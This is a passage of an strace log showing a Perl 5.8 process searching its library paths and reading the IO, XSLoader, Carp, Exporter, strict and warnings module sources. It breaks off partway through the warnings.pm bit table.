6687  07:15:03.332942 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.332955 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.332967 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.332981 stat64("/usr/lib/perl5/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.332992 stat64("/usr/lib/perl5/IO.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333005 stat64("/usr/share/perl5/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.333017 stat64("/usr/share/perl5/IO.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333030 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.333043 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
6687  07:15:03.333063 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.333077 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.333088 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.333111 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
6687  07:15:03.333167 stat64("/etc/perl/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333180 stat64("/etc/perl/XSLoader.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333217 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333231 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333259 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333276 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333290 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333302 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333315 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333328 stat64("/usr/share/perl5/XSLoader.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333341 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.333354 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
6687  07:15:03.333374 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.333388 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.333399 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.333418 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
6687  07:15:03.333658 brk(0x8195000)    = 0x8195000
6687  07:15:03.334008 _llseek(8, 3407, [3407], SEEK_SET) = 0
6687  07:15:03.334026 _llseek(8, 0, [3407], SEEK_CUR) = 0
6687  07:15:03.334037 close(8)          = 0
6687  07:15:03.334082 stat64("/etc/perl/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334097 stat64("/etc/perl/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334111 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334123 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334137 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334149 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334163 stat64("/usr/lib/perl5/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334174 stat64("/usr/lib/perl5/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334213 stat64("/usr/share/perl5/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334229 stat64("/usr/share/perl5/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334256 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334268 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334282 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334294 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
6687  07:15:03.334315 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.334330 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.334341 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.334359 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
6687  07:15:03.334832 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
6687  07:15:03.334860 read(8, "", 4096) = 0
6687  07:15:03.334872 close(8)          = 0
6687  07:15:03.334894 stat64("/etc/perl/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334908 stat64("/etc/perl/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334922 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334935 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334949 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334961 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334975 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.334987 stat64("/usr/lib/perl5/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335000 stat64("/usr/share/perl5/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335012 stat64("/usr/share/perl5/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335030 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335042 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335056 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335068 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
6687  07:15:03.335090 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.335104 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.335116 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.335132 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
6687  07:15:03.335613 _llseek(8, 2217, [2217], SEEK_SET) = 0
6687  07:15:03.335630 _llseek(8, 0, [2217], SEEK_CUR) = 0
6687  07:15:03.335641 close(8)          = 0
6687  07:15:03.335756 stat64("/etc/perl/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335774 stat64("/etc/perl/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335787 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335801 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335814 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335827 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335841 stat64("/usr/lib/perl5/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335856 stat64("/usr/lib/perl5/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335870 stat64("/usr/share/perl5/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335882 stat64("/usr/share/perl5/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335895 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335908 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335921 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.335933 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
6687  07:15:03.335954 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.335969 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.335981 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.336000 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
6687  07:15:03.336141 _llseek(8, 598, [598], SEEK_SET) = 0
6687  07:15:03.336155 _llseek(8, 0, [598], SEEK_CUR) = 0
6687  07:15:03.336165 close(8)          = 0
6687  07:15:03.336243 stat64("/etc/perl/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336259 stat64("/etc/perl/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336273 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336286 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336299 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336312 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336326 stat64("/usr/lib/perl5/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336338 stat64("/usr/lib/perl5/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336351 stat64("/usr/share/perl5/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336363 stat64("/usr/share/perl5/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336377 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336389 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336403 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.336415 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
6687  07:15:03.336437 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.336451 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.336462 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.336480 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    